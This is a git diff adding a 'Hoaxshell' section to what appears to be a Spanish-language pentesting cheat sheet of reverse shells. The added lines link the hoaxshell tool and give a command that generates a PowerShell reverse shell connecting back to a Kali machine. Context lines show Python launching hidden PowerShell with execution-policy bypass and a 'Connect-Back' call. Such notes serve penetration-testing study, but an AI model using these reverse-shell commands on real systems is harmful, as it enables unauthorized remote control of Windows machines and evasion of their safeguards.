@@ -165,6 +165,18 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 'Connect-Back"')
 ```
 
+## Hoaxshell 
+
+```bash 
+https://github.com/t3l3machus/hoaxshell     # Descargar la herramienta 
+```
+
+```bash 
+❯ python3 hoaxshell.py -s IP         # Genera un comando en Powershell que contiene una revershell para Windows 
+
+	# IP = Dirección IP de la máquina Kali 
+```
+
 ## Revershell con Python3 
 
 ```bash 
